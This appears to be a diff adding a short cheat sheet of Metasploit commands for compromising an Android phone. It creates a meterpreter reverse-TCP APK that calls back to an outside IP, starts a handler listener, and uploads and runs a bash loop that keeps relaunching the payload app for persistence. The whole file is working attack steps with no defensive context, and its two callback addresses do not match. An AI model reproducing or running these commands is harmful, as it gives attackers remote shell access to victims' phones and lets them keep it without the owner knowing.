@@ -1,0 +1,29 @@
+CREATE PAYLOAD
+msfpayload android/meterpreter/reverse_tcp LHOST=182.68.42.6 R > /root/abcde.apk
+
+BEGIN LISTENER:
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.0.4
+exploit
+
+BASH PERSISTENT SCRIPT:
+#!/bin/bash
+while :
+do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+sleep 20
+done
+
+UPLOAD THE SCRIPT:
+cd /
+cd /sdcard/Download
+ls
+upload anything.sh
+
+INITIATE THE SCRIPT:
+shell
+cd /
+cd /sdcard/Download
+ls
+sh anything.sh
